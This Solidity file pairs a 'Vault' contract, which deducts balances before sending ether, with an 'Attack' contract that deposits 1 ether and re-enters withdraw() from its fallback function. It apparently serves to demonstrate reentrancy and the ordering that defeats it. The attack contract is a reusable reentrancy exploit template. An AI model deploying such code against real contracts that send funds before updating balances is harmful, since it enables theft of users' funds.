//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault{
    mapping(address => uint256) public balances;

    function deposit() external payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable{
        uint256 bal = balances[msg.sender];
        require(bal > 0);
        //First deduct the balance of the user
        balances[msg.sender] -= bal;

        //Then only send the amount to the user
        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent);
   }

       function getBalanceOfThisContract() public view returns (uint256) {
        return address(this).balance;
    }
}


contract Attack {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        require(msg.value > 0);
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function getBalanceOfThisContract() public view returns (uint256) {
        return address(this).balance;
    }
}
